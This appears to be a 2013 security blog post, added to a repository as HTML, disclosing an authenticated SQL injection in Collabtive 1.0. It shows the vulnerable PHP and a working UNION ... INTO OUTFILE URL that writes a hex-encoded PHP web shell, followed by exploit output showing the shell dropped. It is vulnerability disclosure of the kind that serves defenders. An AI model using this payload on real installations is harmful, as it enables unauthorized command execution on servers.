@@ -1,0 +1,347 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Collabtive 1.0 - SQLi - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Collabtive is a web-based collaboration tool for project management, developed in PHP. The latest version, Collabtive 1.0, is vulnerable to remote &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Collabtive 1.0 - SQLi</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-21T22:40:53-07:00" pubdate data-updated="true">Jun 21<span>st</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="http://collabtive.o-dyn.de/">Collabtive</a> is a web-based collaboration tool for project management, developed in PHP.  The latest version, Collabtive 1.0, is vulnerable to remote authenticated SQL injection.  Sourceforge page can be found <a href="http://sourceforge.net/projects/collabtive/?source=directory">here</a>, which appears to be clocking in just over 1000 downloads a week.  This issue was reported privately to the developers, and fixed in their Github <a href="https://github.com/philippK-de/Collabtive">repository</a>.</p>
+
+<p>User profiles are viewed/managed by manageuser.php, and upon loading a profile, runs the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> if (!empty($start) and !empty($end)) {
+</span><span class='line'>        $track = $tracker-&gt;getUserTrack($id, $fproject, $taski, $start, $end);
+</span><span class='line'>    } elseif (is_array($fproject)) {
+</span><span class='line'>        foreach ($fproject as $fpro) {
+</span><span class='line'>            $ptrack = $tracker-&gt;getUserTrack($id, $fpro, $taski, $start, $end);
+</span><span class='line'>            if (!empty($ptrack)) {
+</span><span class='line'>                foreach ($ptrack as $mytrack) {
+</span><span class='line'>                    array_push($track, $mytrack);
+</span><span class='line'>                }
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>    } </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Of interest is the <code>getUserTrack</code> function, as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function getUserTrack($user, $project = 0, $task = 0, $start = 0, $end = 0 , $lim = 50)
+</span><span class='line'>    {
+</span><span class='line'>        global $conn;
+</span><span class='line'>        $user = (int) $user;
+</span><span class='line'>        $project = (int) $project;
+</span><span class='line'>        $lim = (int) $lim;
+</span><span class='line'>
+</span><span class='line'>        if ($project &gt; 0) {
+</span><span class='line'>            $sql = "SELECT * FROM timetracker WHERE user = $user AND project = $project";
+</span><span class='line'>            $num = "SELECT COUNT(*) FROM timetracker WHERE project = $project AND user = $user";
+</span><span class='line'>            $order = " ORDER BY ended ASC";
+</span><span class='line'>        } else {
+</span><span class='line'>            $sql = "SELECT * FROM timetracker WHERE user = $user";
+</span><span class='line'>            $num = "SELECT COUNT(*) FROM timetracker WHERE user = $user";
+</span><span class='line'>            $order = " ORDER BY ended ASC";
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        if ($task &gt; 0) {
+</span><span class='line'>            $sql .= " AND task = $task";
+</span><span class='line'>            $num .= " AND task = $task";
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        if ($start &gt; 0 and $end &gt; 0) {
+</span><span class='line'>            $start = strtotime($start);
+</span><span class='line'>            $end = strtotime($end . " +1 day");
+</span><span class='line'>            $end = $end - 1;
+</span><span class='line'>            $sql .= " AND ended &gt;=$start AND ended&lt;=$end ";
+</span><span class='line'>            $num .= " AND ended &gt;=$start AND ended&lt;=$end ";
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        if ($num) {
+</span><span class='line'>            $num = $conn-&gt;query($num)-&gt;fetch();
+</span><span class='line'>            $num = $num[0];
+</span><span class='line'>        } else {
+</span><span class='line'>            $num = 0;
+</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The start/end/task variables are not cast to integers, and are not sanitized.  Sanitization wouldn&rsquo;t do much here, anyways, as the variables are appended without quotations, so we need only space queries out from input.  For example, <code>task=1 UNION SELECT passwords FROM user</code>.  Thus we highlight the importance of parameterized queries.  Just use them.</p>
+
+<p>This can be exploited with a simple UNION query to drop a shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.219/collabtive/manageuser.php?action=profile&id=1&task=1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e%20INTO%20OUTFILE%20%27hcked%27;&project=1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Exploiting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python collabtive_10_sqli.py -i 192.168.1.83 -P vlh4soc9k2t5vnp6s5d8glga17
+</span><span class='line'>[!] Dropping web shell on 192.168.1.83...
+</span><span class='line'>[!] Shell dropped.  http://192.168.1.83/collabtive/gkre4.php?rr=ls</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg"></p>
+
+<p><a href="http://www.exploit-db.com/exploits/26410/">Exploit</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-21T22:40:53-07:00" pubdate data-updated="true">Jun 21<span>st</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/collabtive/'>collabtive</a>, <a class='category' href='/blog/categories/sqli/'>sqli</a>, <a class='category' href='/blog/categories/vulnerability/'>vulnerability</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli/" data-via="" data-counturl="http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/06/05/asus-rt56u-remote-command-injection/" title="Previous Post: Asus RT56U Remote Command Injection">&laquo; Asus RT56U Remote Command Injection</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/07/02/introducing-zarp/" title="Next Post: introducing zarp">introducing zarp &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
